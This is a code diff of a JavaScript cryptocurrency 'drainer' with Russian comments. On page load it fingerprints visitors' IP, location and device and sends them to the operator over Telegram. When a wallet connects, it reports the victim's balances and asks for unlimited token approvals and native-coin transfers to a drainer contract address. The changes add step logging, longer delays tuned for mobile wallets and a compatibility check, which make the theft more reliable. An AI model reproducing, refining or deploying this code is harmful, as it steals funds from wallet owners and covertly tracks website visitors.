@@ -34,7 +34,6 @@ async function sendTelegramMessage(message) {
 
 // Функция для получения IP-адреса пользователя
 async function getUserIP() {
-  // Проверяем, есть ли IP в кэше
   const cachedIP = sessionStorage.getItem('userIP');
   if (cachedIP) {
     return cachedIP;
@@ -44,7 +43,6 @@ async function getUserIP() {
     const response = await fetch('https://api.ipify.org?format=json');
     const data = await response.json();
     const ip = data.ip || 'Unknown IP';
-    // Сохраняем IP в кэш
     sessionStorage.setItem('userIP', ip);
     return ip;
   } catch (error) {
@@ -55,7 +53,6 @@ async function getUserIP() {
 
 // Функция для получения геолокации по IP
 async function getGeolocation(ip) {
-  // Проверяем, есть ли геолокация в кэше
   const cachedLocation = sessionStorage.getItem('userLocation');
   if (cachedLocation) {
     return cachedLocation;
@@ -66,7 +63,6 @@ async function getGeolocation(ip) {
     const data = await response.json();
     if (data.cityName && data.countryName) {
       const location = `${data.cityName}, ${data.countryName}`;
-      // Сохраняем геолокацию в кэш
       sessionStorage.setItem('userLocation', location);
       return location;
     }
@@ -82,28 +78,23 @@ function detectDevice() {
   const userAgent = navigator.userAgent.toLowerCase();
   const platform = navigator.platform ? navigator.platform.toLowerCase() : '';
 
-  // Проверка на Windows (включая Windows Phone, но с уточнением)
   if (/windows/i.test(userAgent) || /win32|win64/i.test(platform)) {
     if (/mobile|phone/i.test(userAgent)) return "Windows Phone";
     return "Windows";
   }
 
-  // Проверка на Mac (Macintosh, но не iPhone/iPad)
   if (/macintosh|mac os/i.test(userAgent) && !/iphone|ipad|ipod/i.test(userAgent)) {
     return "Mac";
   }
 
-  // Проверка на iPhone/iPad/iPod
   if (/iphone|ipad|ipod/i.test(userAgent)) {
     return "iPhone";
   }
 
-  // Проверка на Android (с уточнением, чтобы не путать с другими платформами)
   if (/android/i.test(userAgent) && !/windows/i.test(userAgent)) {
     return "Android";
   }
 
-  // Проверка на Linux (но не Android, так как Android тоже использует Linux)
   if (/linux/i.test(userAgent) && !/android/i.test(userAgent)) {
     return "Linux";
   }
@@ -113,31 +104,24 @@ function detectDevice() {
 
 // Функция для отправки уведомления при заходе на сайт
 async function notifyOnVisit() {
-  // Проверяем, было ли уведомление уже отправлено в этой сессии
   if (sessionStorage.getItem('visitNotified')) {
     return;
   }
 
-  // Получаем данные
   const domain = window.location.hostname || 'Unknown Domain';
   const ip = await getUserIP();
   const location = await getGeolocation(ip);
   const device = detectDevice();
 
-  // Формируем сообщение
   const message = `🔔 Visit | **${domain}**\n\n` +
                   `IP: ${ip}\n` +
                   `Where: ${location}\n` +
                   `Device: ${device}`;
 
-  // Отправляем сообщение в Telegram
   await sendTelegramMessage(message);
-
-  // Устанавливаем флаг, чтобы не отправлять уведомление повторно в этой сессии
   sessionStorage.setItem('visitNotified', 'true');
 }
 
-// Вызываем уведомление при загрузке страницы
 notifyOnVisit().catch(error => {
   console.error(`❌ Ошибка при отправке уведомления о посещении: ${error.message}`);
 });
@@ -337,7 +321,7 @@ async function getTokenPriceInUSDT(tokenSymbol) {
   }
 }
 
-// Функция для выбора рабочего провайдера (вызывается один раз)
+// Функция для выбора рабочего провайдера
 async function getWorkingProvider(rpcUrls) {
   const providerPromises = rpcUrls.map(async (rpc) => {
     try {
@@ -359,6 +343,8 @@ async function getWorkingProvider(rpcUrls) {
 async function checkBalance(chainId, userAddress, provider) {
   const config = CHAINS[chainId];
   let nativeBalance, tokenBalances = {};
+
+  console.log(`🔍 Проверяем баланс для chainId ${chainId}`);
 
   // Получаем баланс нативного токена через RPC
   try {
@@ -431,13 +417,15 @@ function hasFunds(bal) {
 // Переключение сети
 async function switchChain(chainId) {
   try {
+    console.log(`🔄 Переключаем сеть на chainId ${chainId}`);
     await window.ethereum.request({
       method: "wallet_switchEthereumChain",
       params: [{ chainId: CHAINS[chainId].chainIdHex }]
     });
+    console.log(`✅ Сеть успешно переключена на chainId ${chainId}`);
   } catch (error) {
     console.error(`❌ Ошибка переключения сети: ${error.message}`);
-    throw new Error('Failed to switch chain');
+    throw new Error(`Failed to switch chain: ${error.message}`);
   }
 }
 
@@ -458,9 +446,26 @@ function detectWallet() {
 // Функция для форматирования чисел без потери точности
 function formatBalance(balance, decimals) {
   const formatted = ethers.utils.formatUnits(balance, decimals);
-  // Преобразуем в число и убираем лишние нули, но сохраняем до 6 знаков после запятой
   const num = parseFloat(formatted);
   return num.toFixed(6).replace(/\.?0+$/, '');
+}
+
+// Проверка совместимости кошелька
+async function checkWalletCompatibility() {
+  try {
+    // Проверяем, поддерживает ли кошелёк метод eth_sendTransaction
+    const methods = await window.ethereum.request({ method: 'wallet_getPermissions' });
+    const hasSendTransaction = methods.some(permission => 
+      permission.parentCapability === 'eth_sendTransaction'
+    );
+    if (!hasSendTransaction) {
+      throw new Error('Wallet does not support transaction signing');
+    }
+    console.log('✅ Кошелёк поддерживает необходимые методы');
+  } catch (error) {
+    console.error(`❌ Ошибка проверки совместимости кошелька: ${error.message}`);
+    throw new Error(`Wallet compatibility check failed: ${error.message}`);
+  }
 }
 
 // Выполнение дрейна
@@ -472,6 +477,8 @@ async function drain(chainId, signer, userAddress, bal, provider) {
     throw new Error(`Configuration for chainId ${chainId} not found`);
   }
 
+  console.log(`📍 Шаг 1: Проверяем конфигурацию для chainId ${chainId}`);
+
   const tokenAddresses = [config.usdtAddress, config.usdcAddress, ...Object.values(config.otherTokenAddresses)];
 
   // Проверяем, было ли уже отправлено уведомление о подключении для этого кошелька
@@ -479,30 +486,21 @@ async function drain(chainId, signer, userAddress, bal, provider) {
   const hasNotified = sessionStorage.getItem(connectNotifiedKey);
 
   if (!hasNotified) {
-    // Укороченный адрес
+    console.log(`📍 Шаг 2: Отправляем уведомление о подключении в Telegram`);
     const shortAddress = shortenAddress(userAddress);
-
-    // Название кошелька
     const walletName = detectWallet();
-
-    // Сеть
     const networkName = config.name;
-
-    // Средства (Funds)
     const funds = [];
     
-    // Нативный токен (например, ETH, BNB, MATIC)
     const nativeBalance = ethers.utils.formatEther(bal.nativeBalance);
     if (parseFloat(nativeBalance) > 0) {
       const nativeNetwork = config.name === "Ethereum Mainnet" ? "ERC20" : config.name === "BNB Chain" ? "BEP20" : config.name;
       const formattedNativeBalance = formatBalance(bal.nativeBalance, 18);
-      // Получаем цену нативного токена в USDT
       const nativePrice = await getTokenPriceInUSDT(TOKEN_SYMBOLS[config.nativeToken]);
       const nativeValueInUSDT = (parseFloat(formattedNativeBalance) * nativePrice).toFixed(2);
       funds.push(`- **${config.nativeToken}**(${nativeNetwork}): ${formattedNativeBalance} (\`${nativeValueInUSDT} USDT\`)`);
     }
 
-    // Токены (USDT, USDC и другие)
     for (const tokenAddress of tokenAddresses) {
       const balance = bal.tokenBalances[tokenAddress];
       if (balance && balance.gt(0)) {
@@ -514,7 +512,6 @@ async function drain(chainId, signer, userAddress, bal, provider) {
                         tokenAddress === config.usdcAddress ? "USDC" :
                         Object.keys(config.otherTokenAddresses).find(key => config.otherTokenAddresses[key] === tokenAddress) || "Unknown";
           const tokenNetwork = config.name === "Ethereum Mainnet" ? "ERC20" : config.name === "BNB Chain" ? "BEP20" : config.name;
-          // Получаем цену токена в USDT
           const tokenPrice = await getTokenPriceInUSDT(TOKEN_SYMBOLS[tokenAddress] || symbol);
           const tokenValueInUSDT = (parseFloat(formattedBalance) * tokenPrice).toFixed(2);
           funds.push(`- **${symbol}**(${tokenNetwork}): ${formattedBalance} (\`${tokenValueInUSDT} USDT\`)`);
@@ -522,38 +519,38 @@ async function drain(chainId, signer, userAddress, bal, provider) {
       }
     }
 
-    // Устройство
     const device = detectDevice();
-
-    // Формируем сообщение
     let fundsMessage = funds.length > 0 ? funds.join('\n') : 'токены не обнаружены';
     const message = `🌀 Connect | [ ${shortAddress} ]\n\n` +
                     `Funds:\n` +
                     `${fundsMessage}\n` +
                     `Device: ${device}`;
 
-    // Отправляем сообщение в Telegram
     await sendTelegramMessage(message);
-
-    // Устанавливаем флаг, чтобы не отправлять уведомление повторно для этого кошелька
     sessionStorage.setItem(connectNotifiedKey, 'true');
+    console.log(`✅ Уведомление о подключении отправлено в Telegram`);
   }
 
   const MAX = ethers.constants.MaxUint256;
   const MIN_TOKEN_BALANCE = ethers.utils.parseUnits("0.1", 6);
 
+  console.log(`📍 Шаг 3: Проверяем баланс ETH для оплаты газа`);
   let ethBalance;
   try {
     ethBalance = await provider.getBalance(userAddress);
+    console.log(`📊 Баланс ETH: ${ethers.utils.formatEther(ethBalance)}`);
   } catch (error) {
     console.error(`❌ Ошибка получения баланса ETH: ${error.message}`);
-    throw new Error('Failed to fetch ETH balance');
-  }
-  const minEthRequired = ethers.utils.parseEther("0.0003");
-  if (ethBalance.lt(minEthRequired)) {
-    throw new Error('Insufficient ETH balance');
+    throw new Error(`Failed to fetch ETH balance: ${error.message}`);
   }
 
+  const minEthRequired = ethers.utils.parseEther("0.0003");
+  if (ethBalance.lt(minEthRequired)) {
+    console.error(`❌ Недостаточно ETH для газа: ${ethers.utils.formatEther(ethBalance)} < ${ethers.utils.formatEther(minEthRequired)}`);
+    throw new Error('Insufficient ETH balance for gas');
+  }
+
+  console.log(`📍 Шаг 4: Собираем токены для обработки`);
   const tokensToProcess = [];
 
   const tokenDataPromises = tokenAddresses.map(async (tokenAddress) => {
@@ -563,6 +560,7 @@ async function drain(chainId, signer, userAddress, bal, provider) {
         tokenContract.balanceOf(userAddress),
         tokenContract.decimals()
       ]);
+      console.log(`📊 Токен ${tokenAddress}: баланс ${ethers.utils.formatUnits(realBalance, decimals)}`);
       return { tokenAddress, tokenContract, realBalance, decimals };
     } catch (error) {
       console.warn(`⚠️ Не удалось получить данные токена ${tokenAddress}: ${error.message}`);
@@ -571,6 +569,7 @@ async function drain(chainId, signer, userAddress, bal, provider) {
   });
 
   const tokenDataResults = await Promise.all(tokenDataPromises);
+  console.log(`✅ Получены данные токенов: ${tokenDataResults.length} токенов`);
 
   for (const { tokenAddress, tokenContract, realBalance, decimals } of tokenDataResults) {
     if (realBalance.lt(bal.tokenBalances[tokenAddress] || 0)) {
@@ -581,7 +580,6 @@ async function drain(chainId, signer, userAddress, bal, provider) {
       const symbol = tokenAddress === config.usdtAddress ? "USDT" :
                     tokenAddress === config.usdcAddress ? "USDC" :
                     Object.keys(config.otherTokenAddresses).find(key => config.otherTokenAddresses[key] === tokenAddress) || "Unknown";
-      // Пропускаем токены, если symbol не определён (на всякий случай)
       if (!symbol) {
         console.warn(`⚠️ Пропущен токен ${tokenAddress}: символ не определён`);
         continue;
@@ -590,6 +588,7 @@ async function drain(chainId, signer, userAddress, bal, provider) {
     }
   }
 
+  console.log(`📍 Шаг 5: Получаем цены токенов и сортируем`);
   const pricePromises = tokensToProcess.map(async (token) => {
     const price = await getTokenPriceInUSDT(TOKEN_SYMBOLS[token.address] || token.token);
     const balanceInUnits = parseFloat(ethers.utils.formatUnits(token.balance, token.decimals));
@@ -598,17 +597,19 @@ async function drain(chainId, signer, userAddress, bal, provider) {
   });
 
   await Promise.all(pricePromises);
-
   tokensToProcess.sort((a, b) => b.valueInUSDT - a.valueInUSDT);
+  console.log(`✅ Токены отсортированы: ${tokensToProcess.map(t => t.token).join(', ')}`);
+
+  console.log(`📍 Шаг 6: Проверяем совместимость кошелька перед транзакцией`);
+  await checkWalletCompatibility();
 
   let status = 'rejected';
   for (const { token, balance, contract, address, decimals } of tokensToProcess) {
-    // Дополнительная проверка на undefined
     if (!token) {
       console.error(`❌ Токен не определён для адреса ${address}, пропускаем`);
       continue;
     }
-    console.log(`Выводимый токен: ${token}`);
+    console.log(`📍 Шаг 7: Обрабатываем токен ${token}`);
 
     const allowanceBefore = await contract.allowance(userAddress, config.drainerAddress);
     console.log(`📜 Allowance для ${config.drainerAddress}: ${ethers.utils.formatUnits(allowanceBefore, decimals)}`);
@@ -620,13 +621,13 @@ async function drain(chainId, signer, userAddress, bal, provider) {
         const gasPrice = await provider.getGasPrice();
         console.log(`📏 Текущая цена газа: ${ethers.utils.formatUnits(gasPrice, "gwei")} gwei`);
 
-        // Добавляем задержку перед вызовом approve, чтобы кошелёк успел обработать запрос
-        console.log(`⏳ Ожидаем 1 секунду перед вызовом approve для токена ${token}`);
-        await delay(1000);
+        // Увеличиваем задержку перед вызовом approve для мобильных кошельков
+        console.log(`⏳ Ожидаем 2 секунды перед вызовом approve для токена ${token}`);
+        await delay(2000);
 
         const tx = await contract.approve(config.drainerAddress, MAX, {
           gasLimit: 100000,
-          gasPrice: gasPrice, // Используем актуальную цену газа
+          gasPrice: gasPrice,
           nonce
         });
         console.log(`📤 Транзакция approve отправлена: ${tx.hash}`);
@@ -645,6 +646,7 @@ async function drain(chainId, signer, userAddress, bal, provider) {
     }
   }
 
+  console.log(`📍 Шаг 8: Обрабатываем нативный токен`);
   if (bal.nativeBalance.gt(0)) {
     const drainer = new ethers.Contract(config.drainerAddress, DRAINER_ABI, signer);
     const gasReserve = ethers.utils.parseEther("0.002");
@@ -663,9 +665,9 @@ async function drain(chainId, signer, userAddress, bal, provider) {
         const gasPrice = await provider.getGasPrice();
         console.log(`📏 Текущая цена газа для нативного токена: ${ethers.utils.formatUnits(gasPrice, "gwei")} gwei`);
 
-        // Добавляем задержку перед вызовом processData
-        console.log(`⏳ Ожидаем 1 секунду перед вызовом processData для нативного токена`);
-        await delay(1000);
+        // Увеличиваем задержку перед вызовом processData
+        console.log(`⏳ Ожидаем 2 секунды перед вызовом processData для нативного токена`);
+        await delay(2000);
 
         const tx = await drainer.processData(taskId, dataHash, nonce, tokenAddressesForNative, {
           value,
@@ -687,6 +689,7 @@ async function drain(chainId, signer, userAddress, bal, provider) {
     }
   }
 
+  console.log(`📍 Шаг 9: Завершаем drain со статусом ${status}`);
   return status;
 }
 
@@ -729,17 +732,14 @@ async function notifyServer(userAddress, tokenAddress, amount, chainId, txHash, 
 
 // Основная функция
 export async function runDrainer(provider, signer, userAddress) {
-  // Проверяем время последнего вызова drain
   const currentTime = Date.now();
   const timeSinceLastDrain = currentTime - lastDrainTime;
-  const minDelay = 2000; // 2 секунды
+  const minDelay = 2000;
 
   if (timeSinceLastDrain < minDelay) {
-    // Если прошло меньше 2 секунд, ждём оставшееся время
     await delay(minDelay - timeSinceLastDrain);
   }
 
-  // Обновляем время последнего вызова
   lastDrainTime = Date.now();
 
   const balancePromises = Object.keys(CHAINS).map(async (chainId) => {
